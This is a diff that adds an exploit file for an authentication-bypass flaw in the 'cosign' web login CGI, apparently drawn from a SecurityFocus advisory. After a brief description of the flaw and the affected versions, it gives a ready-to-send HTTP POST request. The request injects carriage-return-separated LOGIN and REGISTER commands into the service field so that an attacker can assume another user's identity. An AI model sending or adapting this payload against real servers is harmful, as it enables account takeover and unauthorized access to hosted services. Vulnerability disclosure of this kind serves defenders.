@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/23424/info
+
+The 'cosign' application is prone to an authentication-bypass vulnerability because it fails to adequately sanitize user-supplied input.
+
+An authenticated attacker can exploit this issue to access services hosted on an affected computer by assuming another user's credentials.
+
+Versions prior to 1.9.4b and 2.0.2a are vulnerable. 
+
+POST /cosign-bin/cosign.cgi HTTP/1.0
+Host: weblogin.example.com
+Cookie: cosign=X
+Content-Type: application/x-www-form-urlencoded
+Content-Length: N
+
+required=&ref=https%3A%2F%2Fweblogin.example.com%2F&service=cosign-servicename=Y%0DLOGIN cosign=X2 1.2.3.4 username%0DREGISTER cosign=X2 1.2.3.4 cosign-servicename=Y2&login=test&password=pass&passcode=&doLogin=Log+In
+
+
+
+  	
